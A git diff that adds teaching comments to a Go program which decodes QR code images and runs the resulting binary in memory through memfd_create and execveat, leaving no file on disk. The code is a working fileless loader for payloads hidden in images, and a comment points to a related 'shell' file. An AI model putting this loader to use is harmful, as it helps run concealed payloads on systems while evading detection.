@@ -45,14 +45,14 @@ func decodeQRCode(filename string) (string, error) {
 	return result.GetText(), nil
 }
 
-// executeBinaryInMemory executes the given binary data in memory.
+// executeBinaryInMemory executes the given binary data in memory. The code below uses memfdcreate from the go unix library and creates the memory file "memexec". The flag 0 means that no special flags have been set. 
 func executeBinaryInMemory(binaryData []byte) error {
 	fd, err := unix.MemfdCreate("memexec", 0)
 	if err != nil {
 		return fmt.Errorf("MemfdCreate error: %v", err)
 	}
 	defer unix.Close(fd)
-
+	// The code here specifically "unix.Write(fd, binaryData)" then writes the binary into the memfd file using fd (file discriptor) (which we created using memfd_create).
 	n, err := unix.Write(fd, binaryData)
 	if err != nil || n != len(binaryData) {
 		return fmt.Errorf("Write error: %v (wrote %d of %d)", err, n, len(binaryData))
@@ -66,10 +66,13 @@ func executeBinaryInMemory(binaryData []byte) error {
 	envp := os.Environ()
 
 	return execveatEmptyPath(fd, argv, envp)
+	// The above code creates argv which is just a placeholder for the memexec_binary.
+//envp obtains the environment variables from os.Environ().
 }
 
 // execveatEmptyPath calls execveat(fd, "", argv, envp, AT_EMPTY_PATH).
 func execveatEmptyPath(fd int, argv []string, envp []string) error {
+	// In the above code, what we are doing is passing in the file descriptor, argv and envp.
 	argvPtrs := make([]*byte, len(argv)+1)
 	for i, s := range argv {
 		cstr, err := unix.BytePtrFromString(s)
@@ -78,7 +81,7 @@ func execveatEmptyPath(fd int, argv []string, envp []string) error {
 		}
 		argvPtrs[i] = cstr
 	}
-
+	//The function then inits a slice called argvPtrs to store c-style string pointers since syscalls in C want argv's to be arrays of C strings. 
 	envpPtrs := make([]*byte, len(envp)+1)
 	for i, e := range envp {
 		cstr, err := unix.BytePtrFromString(e)
@@ -87,7 +90,8 @@ func execveatEmptyPath(fd int, argv []string, envp []string) error {
 		}
 		envpPtrs[i] = cstr
 	}
-
+	//The for loop then converts each string in argv and returns an error if there are any invalid strings.To ensure a slice is terminated with a nil pointer we use (len(argv)+1)
+	
 	emptyStringPtr, _ := unix.BytePtrFromString("")
 
 	const SYS_EXECVEAT = unix.SYS_EXECVEAT
@@ -107,8 +111,17 @@ func execveatEmptyPath(fd int, argv []string, envp []string) error {
 		return fmt.Errorf("execveat returned %d unexpectedly", r1)
 	}
 	return nil
-}
 
+// SYS_EXECVEAT, --> This is the syscall
+// uintptr(fd), --> passing in the file descriptor
+// uintptr(unsafe.Pointer(emptyStringPtr)), --> The path here is empty because we are using the AT_EMPTY_PATH (refer to the man page)
+// uintptr(unsafe.Pointer(&argvPtrs[0])), --> pointer to argv arr
+// uintptr(unsafe.Pointer(&envpPtrs[0])), --> pointer to envp arr
+// uintptr(AT_EMPTY_PATH), // AT_EMPTY_PATH to use execveat with fd
+// 0, --> we did not need to use this
+
+}
+// Simple what happens here. Refer to alltogetherfinalshell to see how QR code is put together using recursion. Decode QR code then execute binary in memory. 
 func main() {
 	decodedPart1, err := decodeQRCode("./images/basic_qrcode_part_1.png")
 	if err != nil {
